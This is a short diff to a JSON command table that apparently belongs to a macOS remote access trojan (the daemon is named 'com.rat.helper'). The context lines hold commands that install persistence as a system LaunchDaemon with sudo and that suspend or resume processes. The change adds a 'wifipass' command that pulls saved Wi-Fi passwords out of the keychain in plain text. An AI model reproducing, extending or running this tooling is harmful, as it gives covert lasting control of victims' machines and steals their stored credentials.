@@ -43,6 +43,7 @@
     "persist_on": "sudo launchctl bootstrap system /Library/LaunchDaemons/com.rat.helper.plist",
     "persist_off": "sudo launchctl bootout system /Library/LaunchDaemons/com.rat.helper.plist",
     "suspend": "kill -STOP <pid>",
-    "restore": "kill -CONT <pid>"
+    "restore": "kill -CONT <pid>",
+    "wifipass": "security find-generic-password -wa <ssid>"
   }
 }
